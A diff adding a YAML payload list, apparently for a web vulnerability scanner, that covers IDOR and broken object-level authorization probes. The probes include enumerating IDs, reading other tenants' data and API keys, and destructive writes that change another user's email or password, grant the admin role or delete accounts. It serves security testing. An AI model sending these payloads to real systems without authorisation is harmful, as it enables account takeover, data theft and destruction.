@@ -1,0 +1,377 @@
+defaults:
+  vuln_type: idor
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # Numeric ID — sequential enumeration
+  # ============================================================
+  - technique: idor_numeric
+    injection_surface: path
+    evidence_type: content_match
+    risk: 2
+    payload: "1"
+    notes: "Access resource with ID=1. Compare response body and status when authenticated as a different user who does not own this resource."
+    tags: [numeric, sequential, basic]
+
+  - technique: idor_numeric
+    injection_surface: path
+    evidence_type: content_match
+    risk: 2
+    payload: "2"
+    notes: "Access resource ID=2. Cross-reference with own resources to detect unauthorized data leakage."
+    tags: [numeric, sequential]
+
+  - technique: idor_numeric
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "1"
+    notes: "Numeric ID via query parameter (e.g., ?user_id=1, ?order_id=1, ?account_id=1)."
+    tags: [numeric, query_param]
+
+  - technique: idor_numeric
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: "1"
+    notes: "Numeric ID in JSON request body (e.g., {\"user_id\": 1}). Common in POST/PUT/PATCH endpoints."
+    tags: [numeric, json]
+
+  - technique: idor_numeric
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "0"
+    notes: "ID=0. May return a default, system, or admin resource in implementations that use 0 as a sentinel value."
+    tags: [numeric, zero, edge_case]
+
+  - technique: idor_numeric
+    injection_surface: path
+    evidence_type: error
+    risk: 3
+    payload: "-1"
+    notes: "Negative ID. May trigger error with information disclosure (stack trace, DB query) or bypass unsigned integer checks."
+    tags: [numeric, negative, edge_case]
+
+  - technique: idor_numeric
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 3
+    payload: "999999"
+    notes: "High ID value for non-existent resource. Compare error response for unauthorized vs non-existent — difference reveals authorization logic."
+    tags: [numeric, high_value, enumeration]
+
+  - technique: idor_numeric
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "2147483647"
+    notes: "Max 32-bit signed integer. Tests for integer overflow edge cases in ID parsing."
+    tags: [numeric, int_overflow, edge_case]
+
+  # ============================================================
+  # UUID-based IDOR
+  # ============================================================
+  - technique: idor_uuid
+    injection_surface: path
+    evidence_type: content_match
+    risk: 2
+    payload: "OTHER_USER_UUID"
+    placeholders: [OTHER_USER_UUID]
+    notes: "Access resource with another user's UUID. Discover valid UUIDs from list endpoints, error messages, or predictable UUID v1 timestamps."
+    tags: [uuid, cross_tenant]
+
+  - technique: idor_uuid
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "OTHER_USER_UUID"
+    placeholders: [OTHER_USER_UUID]
+    notes: "UUID via query parameter (e.g., ?user_id=<uuid>)."
+    tags: [uuid, query_param]
+
+  - technique: idor_uuid
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: "OTHER_USER_UUID"
+    placeholders: [OTHER_USER_UUID]
+    notes: "UUID in JSON body. Check POST/PUT/PATCH endpoints that accept resource identifiers."
+    tags: [uuid, json]
+
+  - technique: idor_uuid
+    injection_surface: path
+    evidence_type: content_match
+    risk: 2
+    payload: "00000000-0000-0000-0000-000000000000"
+    notes: "Nil UUID (all zeros). May return a default or system resource, or bypass validation expecting non-nil UUID."
+    tags: [uuid, nil, edge_case]
+
+  - technique: idor_uuid
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "PREDICTED_UUID_V1"
+    placeholders: [PREDICTED_UUID_V1]
+    notes: >
+      UUID v1 prediction. UUID v1 encodes timestamp and MAC address — if one valid UUID v1 is
+      known, nearby UUIDs can be predicted by incrementing the timestamp portion.
+      Use: uuid1-predict tool or manual calculation.
+    tags: [uuid, v1_prediction, enumeration]
+
+  # ============================================================
+  # Path-based IDOR
+  # ============================================================
+  - technique: idor_path
+    injection_surface: path
+    evidence_type: content_match
+    risk: 2
+    payload: "/api/users/OTHER_USER_ID/profile"
+    placeholders: [OTHER_USER_ID]
+    notes: "Access another user's profile via RESTful path. Compare with own profile response."
+    tags: [path, profile, cross_user]
+
+  - technique: idor_path
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "/api/users/OTHER_USER_ID/settings"
+    placeholders: [OTHER_USER_ID]
+    notes: "Access another user's settings. May reveal email, preferences, or security configuration."
+    tags: [path, settings, cross_user]
+
+  - technique: idor_path
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "/api/users/OTHER_USER_ID/orders"
+    placeholders: [OTHER_USER_ID]
+    notes: "Access another user's order history. Check for PII and financial data leakage."
+    tags: [path, orders, cross_user]
+
+  - technique: idor_path
+    injection_surface: path
+    evidence_type: content_match
+    risk: 4
+    payload: "/api/users/OTHER_USER_ID/payment-methods"
+    placeholders: [OTHER_USER_ID]
+    notes: "Access another user's payment methods. High impact — may expose card details or billing info."
+    tags: [path, payment, cross_user, high_impact]
+
+  - technique: idor_path
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "/api/users/OTHER_USER_ID/notifications"
+    placeholders: [OTHER_USER_ID]
+    notes: "Access another user's notifications. May reveal private actions, messages, or system events."
+    tags: [path, notifications, cross_user]
+
+  # ============================================================
+  # BOLA — Broken Object Level Authorization
+  # ============================================================
+  - technique: bola
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "/api/organizations/OTHER_ORG_ID/members"
+    placeholders: [OTHER_ORG_ID]
+    notes: "Access another organization's member list. Cross-tenant BOLA — reveals employee names, emails, roles."
+    tags: [bola, organization, cross_tenant]
+
+  - technique: bola
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "/api/projects/OTHER_PROJECT_ID"
+    placeholders: [OTHER_PROJECT_ID]
+    notes: "Access another team's project. Cross-tenant BOLA — may reveal proprietary data."
+    tags: [bola, project, cross_tenant]
+
+  - technique: bola
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "{\"org_id\": \"OTHER_ORG_ID\"}"
+    placeholders: [OTHER_ORG_ID]
+    notes: "BOLA via JSON body tenant ID override. Send own auth token but change org_id to another tenant."
+    tags: [bola, json, tenant_override]
+
+  - technique: bola
+    injection_surface: header
+    evidence_type: content_match
+    risk: 3
+    payload: "X-Tenant-ID: OTHER_TENANT_ID"
+    placeholders: [OTHER_TENANT_ID]
+    notes: "BOLA via tenant header override. Some multi-tenant APIs trust the X-Tenant-ID header without verifying against the auth token."
+    tags: [bola, header, tenant_override]
+
+  - technique: bola
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "/api/organizations/OTHER_ORG_ID/settings"
+    placeholders: [OTHER_ORG_ID]
+    notes: "Access another organization's settings. May expose billing, SSO config, API keys."
+    tags: [bola, organization, settings, cross_tenant]
+
+  - technique: bola
+    injection_surface: path
+    evidence_type: content_match
+    risk: 4
+    payload: "/api/organizations/OTHER_ORG_ID/api-keys"
+    placeholders: [OTHER_ORG_ID]
+    notes: "Access another organization's API keys. Critical data exposure if successful."
+    tags: [bola, organization, api_keys, cross_tenant, high_impact]
+
+  # ============================================================
+  # GraphQL-specific IDOR
+  # ============================================================
+  - technique: idor_numeric
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "{\"query\": \"{ user(id: OTHER_USER_ID) { id email name } }\"}"
+    placeholders: [OTHER_USER_ID]
+    notes: "GraphQL IDOR — query another user's data by numeric or string ID."
+    tags: [graphql, user, cross_user]
+
+  - technique: bola
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "{\"query\": \"{ organization(id: OTHER_ORG_ID) { name members { email } } }\"}"
+    placeholders: [OTHER_ORG_ID]
+    notes: "GraphQL BOLA — query another organization's data including member emails."
+    tags: [graphql, organization, cross_tenant]
+
+  - technique: idor_numeric
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "{\"query\": \"{ node(id: \\\"GLOBAL_ID\\\") { ... on User { email } } }\"}"
+    placeholders: [GLOBAL_ID]
+    notes: "GraphQL Relay global ID IDOR. Relay IDs are base64-encoded 'Type:ID'. Decode, change the ID portion, re-encode."
+    tags: [graphql, relay, global_id]
+
+  - technique: idor_numeric
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "{\"query\": \"mutation { updateUser(id: OTHER_USER_ID, input: {email: \\\"attacker@evil.com\\\"}) { id } }\"}"
+    placeholders: [OTHER_USER_ID]
+    notes: "GraphQL mutation IDOR — attempt to modify another user's data via mutation."
+    tags: [graphql, mutation, write, cross_user]
+
+  # ============================================================
+  # Write operations (higher risk)
+  # ============================================================
+  - technique: idor_numeric
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 4
+    payload: "{\"user_id\": OTHER_USER_ID, \"email\": \"attacker@evil.com\"}"
+    placeholders: [OTHER_USER_ID]
+    notes: "IDOR write — modify another user's email address. Enables account takeover via password reset."
+    tags: [write, email, cross_user, high_impact]
+
+  - technique: idor_numeric
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 4
+    payload: "{\"user_id\": OTHER_USER_ID, \"role\": \"admin\"}"
+    placeholders: [OTHER_USER_ID]
+    notes: "IDOR write — escalate another user's role to admin. Vertical privilege escalation."
+    tags: [write, privesc, cross_user, high_impact]
+
+  - technique: bola
+    injection_surface: path
+    evidence_type: status_diff
+    risk: 4
+    payload: "DELETE /api/users/OTHER_USER_ID"
+    placeholders: [OTHER_USER_ID]
+    notes: "IDOR delete — attempt to delete another user's account. Send DELETE request with own auth token but target other user's ID."
+    tags: [delete, cross_user, destructive]
+
+  - technique: idor_numeric
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 4
+    payload: "{\"user_id\": OTHER_USER_ID, \"password\": \"newpassword123\"}"
+    placeholders: [OTHER_USER_ID]
+    notes: "IDOR write — change another user's password. Direct account takeover if no additional verification."
+    tags: [write, password, cross_user, high_impact]
+
+  # ============================================================
+  # Encoded ID variants
+  # ============================================================
+  - technique: idor_numeric
+    injection_surface: path
+    encoding: base64
+    evidence_type: content_match
+    risk: 2
+    payload: "MQ=="
+    notes: "Base64-encoded ID=1. Some APIs base64-encode resource IDs for obfuscation (not security)."
+    tags: [numeric, base64, encoded]
+
+  - technique: idor_numeric
+    injection_surface: path
+    encoding: hex
+    evidence_type: content_match
+    risk: 2
+    payload: "31"
+    notes: "Hex-encoded ID=1 (ASCII 0x31). Check if the API accepts hex-encoded identifiers."
+    tags: [numeric, hex, encoded]
+
+  - technique: idor_numeric
+    injection_surface: path
+    encoding: base64
+    evidence_type: content_match
+    risk: 2
+    payload: "eyJ1c2VyX2lkIjoxfQ=="
+    notes: "Base64-encoded JSON {\"user_id\":1}. Some APIs use base64-wrapped JSON as opaque identifiers."
+    tags: [numeric, base64, json_wrapped, encoded]
+
+  # ============================================================
+  # Cookie-based IDOR
+  # ============================================================
+  - technique: idor_numeric
+    injection_surface: cookie
+    evidence_type: content_match
+    risk: 3
+    payload: "OTHER_USER_ID"
+    placeholders: [OTHER_USER_ID]
+    notes: "IDOR via user ID stored in cookie. If the app reads user identity from a cookie value rather than the session, changing it accesses another user's data."
+    tags: [cookie, cross_user]
+
+  # ============================================================
+  # File / object access
+  # ============================================================
+  - technique: idor_path
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "/uploads/OTHER_USER_ID/private-doc.pdf"
+    placeholders: [OTHER_USER_ID]
+    notes: "IDOR to access another user's uploaded files. Check if file storage paths are predictable and unprotected."
+    tags: [path, file_access, uploads]
+
+  - technique: idor_path
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "OTHER_FILENAME"
+    placeholders: [OTHER_FILENAME]
+    notes: "IDOR via filename parameter (?file=<name>). Access other users' files by guessing or enumerating filenames."
+    tags: [filename, file_access]
+
+  - technique: idor_path
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "OTHER_FILE_UUID"
+    placeholders: [OTHER_FILE_UUID]
+    notes: "IDOR via file UUID parameter. Even UUID-based file references may lack authorization checks. Discover UUIDs from shared links or API responses."
+    tags: [uuid, file_access, signed_url]
